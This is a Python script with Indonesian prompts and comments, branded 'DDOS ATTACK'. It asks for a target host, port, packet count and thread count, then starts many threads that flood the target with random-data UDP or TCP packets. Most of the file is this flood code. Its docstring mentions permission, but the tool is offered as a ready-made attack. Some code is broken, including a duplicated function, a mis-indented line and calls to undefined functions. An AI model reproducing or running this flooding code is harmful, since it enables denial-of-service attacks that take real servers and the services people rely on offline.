"""
Banjir UDP.
Ini adalah program serangan 'DDOS' untuk menyerang server, Anda selalu mengatur IP agar Anda memiliki izin untuk melakukannya.
dan port dan jumlah detik dan itu akan mulai membanjiri server itu
"""
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40mJika Anda memiliki masalah, Hubugi Admin Github Nih https://github.com/UziWatzen/Python-UDP-Flood/\n")

print("\033[1;32;40m ==> [ DDOS VINZ:SAMP ] <==  \n")
test = input()
if test == "n":
	exit(0)
print("\033[40m")
print("""

██████╗░███████╗░██████╗████████╗██████╗░░█████╗░
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
██║░░██║█████╗░░╚█████╗░░░░██║░░░██████╔╝██║░░██║
██║░░██║██╔══╝░░░╚═══██╗░░░██║░░░██╔══██╗██║░░██║
██████╔╝███████╗██████╔╝░░░██║░░░██║░░██║╚█████╔╝
╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░
 """)
ip = str(input(" Masukan Host/Ip:"))
port = int(input(" Masukan Port:"))
choice = str(input(" UDP(KETIK [DDOS]):"))
times = int(input(" Masukan Jumlah Packet:"))
threads = int(input(" Masukan Jumlah Threads:"))
def Ddos():
	data = random._urandom(666)
	Az = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(Az +"\033[91m ==> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[91m ==> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))

def Ddos():
	data = random._urandom(890000)
	Az = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(Az +"\033[91m ==> Send Packet To \033[0m%s:%s!!!"%(ip,port))
		except:
			s.close()
			print("\033[91m ==> Send Packrt To \033[0m%s:%s!!!"%(ip,port))

for y in range(threads):
	if choice == 'DDOS':
		th = threading.Thread(target = Ddos)
		th.start()
	else:
		th = threading.Thread(target = Ddos)
		th.start()

def new():
	for y in range(threads):
		if choice == 'DDOS':
			th = threading.Thread(target = Ddos)
			th.start()
		else:
			th = threading.Thread(target = Ddos)
			th.start()

def whereuwere():
    print("Aww, maaf, tapi saya tidak ingat apakah Anda menggunakan TCP atau UDP")
    print("Masukan 1 untuk UDP dan 2 untuk TCP")
    whereman = str(input(" 1 atau 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Anda Meninggalkan Tuan -f miring")
	  sys.exit(130)

def exit_gracefully(signum, frame):
    # mengembalikan Ping Server Orang
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Anda ingin keluar dari bby <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # kembalikan handler keluar yang Dimatikan
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # Untuk Menyimpan Sinyal Server
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)